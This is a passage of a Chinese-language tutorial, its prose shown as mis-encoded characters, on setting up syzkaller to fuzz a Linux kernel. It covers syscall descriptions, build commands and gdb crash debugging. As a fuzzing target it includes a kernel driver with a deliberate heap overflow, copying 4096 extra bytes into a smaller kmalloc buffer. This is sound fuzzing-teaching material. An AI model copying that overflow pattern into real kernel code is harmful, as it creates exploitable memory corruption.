LittleEndian: <span class="hljs-literal">true</span>, ExecutorUsesShmem: <span class="hljs-literal">true</span>, Syscalls: syscalls_amd64, Resources: resources_amd64, Consts: consts_amd64&#125;, types_amd64, InitTarget)<br>&#125;<br><br><span class="hljs-comment">// resourceï¼Œåƒæ˜¯ value èŒƒå›´</span><br><span class="hljs-keyword">var</span> resources_amd64 = []*ResourceDesc&#123;<br>    &#123;Name:<span class="hljs-string">&quot;ANYRES16&quot;</span>,Kind:[]<span class="hljs-type">string</span>&#123;<span class="hljs-string">&quot;ANYRES16&quot;</span>&#125;,Values:[]<span class="hljs-type">uint64</span>&#123;<span class="hljs-number">18446744073709551615</span>,<span class="hljs-number">0</span>&#125;&#125;,<br>    &#123;Name:<span class="hljs-string">&quot;ANYRES32&quot;</span>,Kind:[]<span class="hljs-type">string</span>&#123;<span class="hljs-string">&quot;ANYRES32&quot;</span>&#125;,Values:[]<span class="hljs-type">uint64</span>&#123;<span class="hljs-number">18446744073709551615</span>,<span class="hljs-number">0</span>&#125;&#125;,<br>    &#123;Name:<span class="hljs-string">&quot;ANYRES64&quot;</span>,Kind:[]<span class="hljs-type">string</span>&#123;<span class="hljs-string">&quot;ANYRES64&quot;</span>&#125;,Values:[]<span class="hljs-type">uint64</span>&#123;<span class="hljs-number">18446744073709551615</span>,<span class="hljs-number">0</span>&#125;&#125;,<br>    &#123;Name:<span class="hljs-string">&quot;ANYRES8&quot;</span>,Kind:[]<span class="hljs-type">string</span>&#123;<span class="hljs-string">&quot;ANYRES8&quot;</span>&#125;,Values:[]<span class="hljs-type">uint64</span>&#123;<span class="hljs-number">18446744073709551615</span>,<span class="hljs-number">0</span>&#125;&#125;,<br>    &#123;Name:<span class="hljs-string">&quot;IMG_DEV_VIRTADDR&quot;</span>,Kind:[]<span class="hljs-type">string</span>&#123;<span class="hljs-string">&quot;IMG_DEV_VIRTADDR&quot;</span>&#125;,Values:[]<span class="hljs-type">uint64</span>&#123;<span class="hljs-number">0</span>&#125;&#125;,<br>    ...<br>&#125;<br><br><span class="hljs-comment">// syscallï¼ŒåŒ…å« number ä»¥åŠä¼ å…¥çš„å‚æ•°</span><br><span class="hljs-keyword">var</span> syscalls_amd64 = []*Syscall&#123;<br>    &#123;NR:<span class="hljs-number">43</span>,Name:<span class="hljs-string">&quot;accept&quot;</span>,CallName:<span class="hljs-string">&quot;accept&quot;</span>,Args:[]Field&#123;<br>        &#123;Name:<span class="hljs-string">&quot;fd&quot;</span>,Type:Ref(<span class="hljs-number">11387</span>)&#125;,<br>        &#123;Name:<span class="hljs-string">&quot;peer&quot;</span>,Type:Ref(<span class="hljs-number">10173</span>)&#125;,<br>        &#123;Name:<span class="hljs-string">&quot;peerlen&quot;</span>,Type:Ref(<span class="hljs-number">10453</span>)&#125;,<br>    &#125;,Ret:Ref(<span class="hljs-number">11387</span>)&#125;,<br>    &#123;NR:<span class="hljs-number">43</span>,Name:<span class="hljs-string">&quot;accept$alg&quot;</span>,CallName:<span class="hljs-string">&quot;accept&quot;</span>,Args:[]Field&#123;<br>        &#123;Name:<span class="hljs-string">&quot;fd&quot;</span>,Type:Ref(<span class="hljs-number">11390</span>)&#125;,<br>        &#123;Name:<span class="hljs-string">&quot;peer&quot;</span>,Type:Ref(<span class="hljs-number">5022</span>)&#125;,<br>        &#123;Name:<span class="hljs-string">&quot;peerlen&quot;</span>,Type:Ref(<span class="hljs-number">5022</span>)&#125;,<br>    &#125;,Ret:Ref(<span class="hljs-number">11391</span>)&#125;,<br>    ...<br>&#125;<br><br><span class="hljs-comment">// constsï¼Œä¹Ÿå°±æ˜¯å¸¸æ•°</span><br><span class="hljs-keyword">var</span> consts_amd64 = []ConstValue&#123;<br>    &#123;<span class="hljs-string">&quot;ABS_CNT&quot;</span>,<span class="hljs-number">64</span>&#125;,<br>    &#123;<span class="hljs-string">&quot;ABS_MAX&quot;</span>,<span class="hljs-number">63</span>&#125;,<br>    &#123;<span class="hljs-string">&quot;ACL_EXECUTE&quot;</span>,<span class="hljs-number">1</span>&#125;,<br>    ...<br>&#125;<br></code></pre></td></tr></table></figure><p>é€šè¿‡ <code>RegisterTarget()</code> å‡½æ•°ï¼Œfuzzer æ³¨å†Œäº†ç”¨æˆ·å®šä¹‰çš„ Linux AMD64 ç›®æ ‡çš„ syscall æ ¼å¼ã€‚</p><h3 id="æè¿°ç³»ç»Ÿè°ƒç”¨"><a href="#æè¿°ç³»ç»Ÿè°ƒç”¨" class="headerlink" title="æè¿°ç³»ç»Ÿè°ƒç”¨"></a>æè¿°ç³»ç»Ÿè°ƒç”¨</h3><p>å®šåˆ¶ï¼ˆå³å¯¹æ–°çš„å†…æ ¸æ¥å£ï¼Œå¢åŠ ç³»ç»Ÿè°ƒç”¨æè¿°æ–‡ä»¶ï¼‰æ˜¯ä¸€ä¸ªæ¯”è¾ƒç¹ççš„å›½äº§ï¼Œå®˜æ–¹ç»™äº†å¦‚ä¸‹æ–‡æ¡£ç”¨ä½œå‚è€ƒï¼š</p><ul><li>txtå£°æ˜æ–‡ä»¶çš„æ–¹æ³•ï¼šÂ <a href="https://github.com/google/syzkaller/blob/master/docs/syscall_descriptions_syntax.md">syscall descriptionè¯­æ³•</a></li><li>ä¸€äº›Linuxä¸‹çš„ syscall descriptionï¼š<a href="https://github.com/google/syzkaller/tree/master/sys/linux">ç°æœ‰å¯å‚è€ƒçš„å£°æ˜æ–‡ä»¶</a></li></ul><p>ä»¥ä¸‹ä¸ºä¾‹ï¼Œä»ç³»ç»Ÿè°ƒç”¨<code>open</code>å‡½æ•°å¼€å§‹ï¼Œå®ƒçš„å‡½æ•°å®šä¹‰å¦‚ä¸‹ï¼š</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">open</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">char</span> *pathname, <span class="hljs-type">int</span> flags, <span class="hljs-type">mode_t</span> mode)</span></span>;<br></code></pre></td></tr></table></figure><ul><li>flagsï¼š<code>O_RDONLY, O_WRONLY, O_RDWR, O_APPEND, FASYNC, O_CLOEXEC, O_CREAT, O_DIRECT, O_DIRECTORY, O_EXCL, O_LARGEFILE, O_NOATIME, O_NOCTTY, O_NOFOLLOW, O_NONBLOCK, O_PATH, O_SYNC, O_TRUNC, __O_TMPFILE</code></li><li>modeï¼š<code>S_IRUSR, S_IWUSR, S_IXUSR, S_IRGRP, S_IWGRP, S_IXGRP, S_IROTH, S_IWOTH, S_IXOTH</code></li></ul><p>ç”¨syzlangæ¥æè¿°å®ƒï¼š</p><figure class="highlight inform7"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs inform7">resource fd_test<span class="hljs-comment">[fd]</span>  <br><span class="hljs-keyword">open</span>(file ptr<span class="hljs-comment">[in, filename]</span>, flags flags<span class="hljs-comment">[open_flags]</span>, mode flags<span class="hljs-comment">[open_mode]</span>) fd_test  <br># æˆ–  <br># <span class="hljs-keyword">open</span>(file ptr<span class="hljs-comment">[in, string<span class="hljs-comment">[&quot;/dev/xxx&quot;]</span>]</span>, flags flags<span class="hljs-comment">[open_flags]</span>, mode flags<span class="hljs-comment">[open_mode]</span>) fd_test<br></code></pre></td></tr></table></figure><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs vim">include &lt;linux/fs.h&gt;<br><br><span class="hljs-keyword">open</span>$proc(<span class="hljs-keyword">file</span> <span class="hljs-keyword">ptr</span>[in, <span class="hljs-built_in">string</span>[<span class="hljs-string">&quot;/proc/test&quot;</span>]], flags flags[proc_open_flags], <span class="hljs-keyword">mode</span> flags[proc_open_mode]) fd<br><span class="hljs-keyword">read</span>$proc(fd fd, buf <span class="hljs-keyword">buffer</span>[out], <span class="hljs-built_in">count</span> <span class="hljs-built_in">len</span>[buf]) <span class="hljs-built_in">len</span>[buf]<br><span class="hljs-keyword">write</span>$proc(fd fd, buf <span class="hljs-keyword">buffer</span>[in], <span class="hljs-built_in">count</span> <span class="hljs-built_in">len</span>[buf]) <span class="hljs-built_in">len</span>[buf]<br><span class="hljs-keyword">close</span>$proc(fd fd)<br><br>proc_open_flags = O_RDONLY, O_WRONLY, O_RDWR, O_APPEND, FASYNC, O_CLOEXEC, O_CREAT, O_DIRECT, O_DIRECTORY, O_EXCL, O_LARGEFILE, O_NOATIME, O_NOCTTY, O_NOFOLLOW, O_NONBLOCK, O_PATH, O_SYNC, O_TRUNC, __O_TMPFILE<br>proc_open_mode = S_IRUSR, S_IWUSR, S_IXUSR, S_IRGRP, S_IWGRP, S_IXGRP, S_IROTH, S_IWOTH, S_IXOTH<br></code></pre></td></tr></table></figure><p>ç³»ç»Ÿè°ƒç”¨çš„å£°æ˜åŒ…å«è°ƒç”¨åã€å‚æ•°å’Œè¿”å›å€¼ã€‚æ ¼å¼å¦‚ä¸‹ï¼š</p><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ada">SyscallName$<span class="hljs-keyword">Type</span><br></code></pre></td></tr></table></figure><ul><li><ul><li><code>$</code> å‰æ˜¯ç³»ç»Ÿè°ƒç”¨åï¼ˆå¦‚ <code>open</code>ï¼‰ï¼›</li></ul></li><li><ul><li><code>$</code> åæ˜¯è‡ªå®šä¹‰çš„è°ƒç”¨ç±»å‹ï¼ˆå¦‚ <code>proc</code>ï¼‰ï¼Œåç§°å¯ä»¥è‡ªå®šä¹‰ï¼Œç”¨äºé™åˆ¶è°ƒç”¨è¡Œä¸ºï¼›</li></ul></li><li><ul><li>å‚æ•°æ ¼å¼å¦‚ä¸‹ï¼š</li></ul></li></ul><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css">å‚æ•°å ç±»å‹<span class="hljs-selector-attr">[é™åˆ¶]</span><br></code></pre></td></tr></table></figure><p>ä¾‹å¦‚ï¼š</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css">mode flags<span class="hljs-selector-attr">[proc_open_mode]</span><br></code></pre></td></tr></table></figure><p>è¡¨ç¤º <code>mode</code> æ˜¯ä¸€ä¸ª <code>flags</code> ç±»å‹ï¼Œé™åˆ¶ä¸º <code>proc_open_mode</code> ä¸­çš„å€¼ã€‚</p><p>åœ¨æˆ‘ä»¬çš„ä¾‹å­ä¸­ï¼Œå †æº¢å‡ºæ˜¯é€šè¿‡å‘ <code>/proc/test</code> å†™å…¥æ•°æ®è§¦å‘çš„ï¼Œæ‰€ä»¥éœ€è¦å°† <code>open</code> çš„ <code>file</code> å‚æ•°é™å®šä¸º <code>&quot;/proc/test&quot;</code>ã€‚</p><p>ç„¶åé‡æ–°ç¼–è¯‘syzkaller</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs shell">make clean<br>make bin/syz-extract<br>bin/syz-extract -os linux -arch amd64 -sourcedir /PATH/TO/LINUX/SOURCE sys/YOUR_SYSCALL.txt<br>make all<br></code></pre></td></tr></table></figure><ul><li><ul><li><code>-arch</code>ï¼šç›®æ ‡æ¶æ„ï¼ˆå¦‚ amd64ï¼‰</li></ul></li><li><ul><li><code>-sourcedir</code>ï¼šLinux å†…æ ¸æºç æ‰€åœ¨è·¯å¾„</li></ul></li></ul><h4 id="æ‹·è´binaryåˆ°æµ‹è¯•æœº"><a href="#æ‹·è´binaryåˆ°æµ‹è¯•æœº" class="headerlink" title="æ‹·è´binaryåˆ°æµ‹è¯•æœº"></a>æ‹·è´binaryåˆ°æµ‹è¯•æœº</h4><p>å¯åŠ¨ä½ çš„è™šæ‹Ÿæœºåï¼Œåœ¨å®¿ä¸»æœº syzkaller ç›®å½•ä¸‹æ‰§è¡Œï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">scp -P $(YOUR_PORT) -i ~/.ssh/rsa -r syzkaller/bin root@127.0.0.1:$(YOUR_PATH)<br></code></pre></td></tr></table></figure><ul><li><code>$(YOUR_PORT)</code> æ˜¯ä½ å¯åŠ¨ QEMU æ—¶æŒ‡å®šçš„ç«¯å£ï¼›</li><li><code>$(YOUR_PATH)</code> æ˜¯ VM å†…é…ç½®çš„ç›®å½•è·¯å¾„ã€‚</li></ul><h3 id="å°†æè¿°ä¿¡æ¯ç¼–è¯‘è¿›è¡Œå†…æ ¸"><a href="#å°†æè¿°ä¿¡æ¯ç¼–è¯‘è¿›è¡Œå†…æ ¸" class="headerlink" title="å°†æè¿°ä¿¡æ¯ç¼–è¯‘è¿›è¡Œå†…æ ¸"></a>å°†æè¿°ä¿¡æ¯ç¼–è¯‘è¿›è¡Œå†…æ ¸</h3><h2 id="å®ä¾‹"><a href="#å®ä¾‹" class="headerlink" title="å®ä¾‹"></a>å®ä¾‹</h2><p>è¿™é‡Œæˆ‘ä»¬ä½¿ç”¨ä¸€ä¸ªæ¼æ´é©±åŠ¨æ¥æµ‹è¯•æˆ‘ä»¬çš„ syzkaller æ˜¯å¦å¼€æº fuzz å‡ºæ¥ã€‚</p><ul><li>åˆå§‹åŠ è½½é©±åŠ¨æ—¶ï¼Œä¼šåœ¨<code>/proc</code>æ–‡ä»¶å¤¹ä¸‹åˆ›å»ºæ–‡ä»¶procã€‚è€Œé’ˆå¯¹äº proc çš„è¯»å†™æ“ä½œï¼Œå†…æ ¸å®é™…ä¼šè°ƒç”¨<code>proc_*</code>ç³»åˆ—å‡½æ•°ä¿©è¿›è¡Œå¤„ç†ã€‚</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;linux/init.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;linux/module.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;linux/proc_fs.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;linux/uaccess.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;linux/slab.h&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> MY_DEV_NAME <span class="hljs-string">&quot;test&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> DEBUG_FLAG <span class="hljs-string">&quot;PROC_DEV&quot;</span></span><br><br><span class="hljs-type">static</span> <span class="hljs-type">ssize_t</span> <span class="hljs-title function_">proc_read</span> <span class="hljs-params">(<span class="hljs-keyword">struct</span> file *proc_file, <span class="hljs-type">char</span> __user *proc_user, <span class="hljs-type">size_t</span> n, <span class="hljs-type">loff_t</span> *loff)</span>;<br><span class="hljs-type">static</span> <span class="hljs-type">ssize_t</span> <span class="hljs-title function_">proc_write</span> <span class="hljs-params">(<span class="hljs-keyword">struct</span> file *proc_file, <span class="hljs-type">const</span> <span class="hljs-type">char</span> __user *proc_user, <span class="hljs-type">size_t</span> n, <span class="hljs-type">loff_t</span> *loff)</span>;<br><span class="hljs-type">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">proc_open</span> <span class="hljs-params">(<span class="hljs-keyword">struct</span> inode *proc_inode, <span class="hljs-keyword">struct</span> file *proc_file)</span>;<br><span class="hljs-type">static</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">file_operations</span> <span class="hljs-title">a</span> =</span> &#123;<br>                                .open = proc_open,<br>                                .read = proc_read,<br>                                .write = proc_write,<br>&#125;;<br><br><br><span class="hljs-type">static</span> <span class="hljs-type">int</span> __init <span class="hljs-title function_">mod_init</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">proc_dir_entry</span> *<span class="hljs-title">test_entry</span>;</span><br>    <span class="hljs-type">const</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">file_operations</span> *<span class="hljs-title">proc_fops</span> =</span> &amp;a;<br>    printk(DEBUG_FLAG<span class="hljs-string">&quot;:proc init start!\n&quot;</span>);<br><br><span class="hljs-comment">//åˆ›å»º proc</span><br>    test_entry = proc_create(MY_DEV_NAME, S_IRUGO|S_IWUGO, <span class="hljs-literal">NULL</span>, proc_fops);<br>    <span class="hljs-keyword">if</span>(!test_entry)<br>       printk(DEBUG_FLAG<span class="hljs-string">&quot;:there is somethings wrong!\n&quot;</span>);<br>    <br>    printk(DEBUG_FLAG<span class="hljs-string">&quot;:proc init over!\n&quot;</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br><span class="hljs-type">static</span> <span class="hljs-type">ssize_t</span> <span class="hljs-title function_">proc_read</span> <span class="hljs-params">(<span class="hljs-keyword">struct</span> file *proc_file, <span class="hljs-type">char</span> __user *proc_user, <span class="hljs-type">size_t</span> n, <span class="hljs-type">loff_t</span> *loff)</span><br>&#123;<br>    printk(DEBUG_FLAG<span class="hljs-string">&quot;:finish copy_from_use,the string of newbuf is&quot;</span>);<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br><br><span class="hljs-type">static</span> <span class="hljs-type">ssize_t</span> <span class="hljs-title function_">proc_write</span> <span class="hljs-params">(<span class="hljs-keyword">struct</span> file *proc_file, <span class="hljs-type">const</span> <span class="hljs-type">char</span> __user *proc_user, <span class="hljs-type">size_t</span> n, <span class="hljs-type">loff_t</span> *loff)</span>  <br>&#123;  <br>    <span class="hljs-type">char</span> *c = kmalloc(n + <span class="hljs-number">512</span>, GFP_KERNEL);  <br>    <br><span class="hljs-comment">//æº¢å‡ºï¼ŒåŸå…ˆåªæœ‰ 512 å­—èŠ‚ï¼Œä½†æ˜¯å¤åˆ¶äº† 4096</span><br>    <span class="hljs-type">size_t</span> size = copy_from_user(c, proc_user, n + <span class="hljs-number">4096</span>);  <br>    printk(DEBUG_FLAG<span class="hljs-string">&quot;:into write %ld!\n&quot;</span>, size);  <br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;  <br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">proc_open</span> <span class="hljs-params">(<span class="hljs-keyword">struct</span> inode *proc_inode, <span class="hljs-keyword">struct</span> file *proc_file)</span><br>&#123;<br>    printk(DEBUG_FLAG<span class="hljs-string">&quot;:into open!\n&quot;</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br>module_init(mod_init);<br></code></pre></td></tr></table></figure><h3 id="ç¼–è¯‘è¿›å†…æ ¸"><a href="#ç¼–è¯‘è¿›å†…æ ¸" class="headerlink" title="ç¼–è¯‘è¿›å†…æ ¸"></a>ç¼–è¯‘è¿›å†…æ ¸</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">ä¸‹è½½æºä»£ç è‡³ linux/drivers/char/test.c</span>  <br>proxychains wget -v https://github.com/hardenedlinux/Debian-GNU-Linux-Profiles/raw/master/docs/harbian_qa/fuzz_testing/test.c -O linux/drivers/char/test.c  <br><span class="hljs-meta prompt_"># </span><span class="language-bash">ä¿®æ”¹ Makefile</span>   <br>echo &quot;obj-y += test.o&quot; &gt;&gt; linux/drivers/char/Makefile  <br><span class="hljs-meta prompt_"># </span><span class="language-bash">å°è¯•ç¼–è¯‘</span>  <br>make<br></code></pre></td></tr></table></figure><p>åœ¨<code>/proc/test</code>ä¸‹å¯ä»¥æ‰¾åˆ°ç›®æ ‡</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">ls</span> -al /proc/test<br></code></pre></td></tr></table></figure><h3 id="é…ç½®-syzkallerè§„åˆ™"><a href="#é…ç½®-syzkallerè§„åˆ™" class="headerlink" title="é…ç½® syzkallerè§„åˆ™"></a>é…ç½® syzkallerè§„åˆ™</h3><p>åœ¨<code>syzkaller/sys/linux/</code>åˆ›å»ºä¸€ä¸ªå¯¹åº”äºè¿™ä¸ªæ¼æ´é©±åŠ¨çš„å¤„ç†è§„åˆ™<code>test.txt</code>ï¼Œå†…å®¹å¦‚ä¸‹ï¼š</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs vim">include &lt;linux/fs.h&gt;  <br>   <br><span class="hljs-keyword">open</span>$proc(<span class="hljs-keyword">file</span> <span class="hljs-keyword">ptr</span>[in, <span class="hljs-built_in">string</span>[<span class="hljs-string">&quot;/proc/test&quot;</span>]], flags flags[proc_open_flags], <span class="hljs-keyword">mode</span> flags[proc_open_mode]) fd  <br><span class="hljs-keyword">read</span>$proc(fd fd, buf <span class="hljs-keyword">buffer</span>[out], <span class="hljs-built_in">count</span> <span class="hljs-built_in">len</span>[buf])  <br><span class="hljs-keyword">write</span>$proc(fd fd, buf <span class="hljs-keyword">buffer</span>[in], <span class="hljs-built_in">count</span> <span class="hljs-built_in">len</span>[buf])  <br><span class="hljs-keyword">close</span>$proc(fd fd)  <br>   <br>proc_open_flags = O_RDONLY, O_WRONLY, O_RDWR, O_APPEND, FASYNC, O_CLOEXEC, O_CREAT, O_DIRECT, O_DIRECTORY, O_EXCL, O_LARGEFILE, O_NOATIME, O_NOCTTY, O_NOFOLLOW, O_NONBLOCK, O_PATH, O_SYNC, O_TRUNC, __O_TMPFILE  <br>proc_open_mode = S_IRUSR, S_IWUSR, S_IXUSR, S_IRGRP, S_IWGRP, S_IXGRP, S_IROTH, S_IWOTH, S_IXOTH<br></code></pre></td></tr></table></figure><p>åœ¨ syzkaller é¡¹ç›®æ ¹ç›®å½•ä¸‹æ‰§è¡Œä»¥ä¸‹å‘½ä»¤ä»¥åˆ›å»ºå¯¹åº”çš„.constæ–‡ä»¶ã€‚</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">bin/syz-extract -os linux -sourcedir &quot;/usr/class/linux&quot; -arch amd64 test.txt<br></code></pre></td></tr></table></figure><p>é‡å»º syzkaller</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">bin/syz-sysgen<br>make all<br></code></pre></td></tr></table></figure><h3 id="Fuzz"><a href="#Fuzz" class="headerlink" title="Fuzz"></a>Fuzz</h3><p>åœ¨å¼€å§‹ Fuzz ä¹‹å‰æˆ‘ä»¬éœ€è¦ä¿®æ”¹ syzkaller çš„è¿è¡Œé…ç½®å¯ç”¨è¿™äº›ç³»ç»Ÿè°ƒç”¨ã€‚ä¿®æ”¹my.cfgï¼Œæ·»åŠ ä»¥ä¸‹å†…å®¹ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-string">&quot;enable_syscalls&quot;</span>: [  <br>    <span class="hljs-string">&quot;open<span class="hljs-variable">$proc</span>&quot;</span>,  <br>    <span class="hljs-string">&quot;read<span class="hljs-variable">$proc</span>&quot;</span>,  <br>    <span class="hljs-string">&quot;write<span class="hljs-variable">$proc</span>&quot;</span>,  <br>    <span class="hljs-string">&quot;close<span class="hljs-variable">$proc</span>&quot;</span>  <br>],<br></code></pre></td></tr></table></figure><p>å¼€å§‹ Fuzzï¼š</p><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm"><span class="hljs-keyword">bin/syz-manager </span>-<span class="hljs-built_in">config</span> my.cfg -vv <span class="hljs-number">10</span><br></code></pre></td></tr></table></figure><p>è¿‡ä¸€æ®µæ—¶é—´æˆ‘ä»¬å°±å¯ä»¥å¾—åˆ°ï¼š</p><p>ç„¶å syzkaller å°±ä¼šå¤ç° crashã€‚</p><h3 id="åˆ†æcrash"><a href="#åˆ†æcrash" class="headerlink" title="åˆ†æcrash"></a>åˆ†æcrash</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs shell">qemu-system-x86_64 \<br>  -kernel arch/x86/boot/bzImage \<br>  -append &quot;console=ttyS0 nokaslr&quot; \<br>  -nographic \<br>  -s -S<br></code></pre></td></tr></table></figure><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">gdb</span> ./vmlinux<br><span class="hljs-attribute">target</span> remote :<span class="hljs-number">1234</span><br></code></pre></td></tr></table></figure><p>ä½¿ç”¨ gdb è¿›è¡Œå•æ­¥è°ƒè¯•éœ€è¦ä¿®æ”¹é…ç½®æ–‡ä»¶</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-attr">&quot;vm&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><br>  ...<br>  <span class="hljs-attr">&quot;count&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">1</span><span class="hljs-punctuation">,</span><br>  <span class="hljs-attr">&quot;qemu_args&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;-gdb tcp::1234&quot;</span><br><span class="hljs-punctuation">]</span><br></code></pre></td></tr></table></figure><p>ç„¶ååœ¨å®¿ä¸»æœºè¿è¡Œï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell">gdb -q build_tree/vmlinux <br>Reading symbols from build_tree/vmlinux...done.<br>(gdb) target remote :1234<br></code></pre></td></tr></table></figure><p>å¦‚æœä½ éœ€è¦è°ƒè¯•å†…æ ¸æ¨¡å—ï¼Œé¦–å…ˆ SSH åˆ° VMï¼Œæ‰“å°æ¨¡å—æ®µåœ°å€ï¼š</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">cat <span class="hljs-regexp">/sys/m</span>odule<span class="hljs-regexp">/$(YOUR_MODULE)/</span>sections<span class="hljs-regexp">/.text /</span>sys<span class="hljs-regexp">/module/</span>$(YOUR_MODULE)<span class="hljs-regexp">/sections/</span>.data <span class="hljs-regexp">/sys/m</span>odule<span class="hljs-regexp">/$(YOUR_MODULE)/</span>sections/.bss<br></code></pre></td></tr></table></figure><p>æ·»åŠ ç¬¦å·æ–‡ä»¶</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">add-symbol-file /$(YOUR_BUILD_TREE)/$(YOUR_MODULE)/$(YOUR_MODULE).ko $(ADDR_OF_TEXT) -s data $(ADDR_OF_DATA) -s bss $(ADDR_OF_BSS)<br></code></pre></td></tr></table></figure><p>ç°åœ¨ä½ å°±å¯ä»¥åœ¨æ¨¡å—ä¸­ä¸‹æ–­ç‚¹äº†ã€‚ æˆ‘ä½¿ç”¨ KGDB æ¥åˆ†æ syzkaller è§¦å‘çš„å†…æ 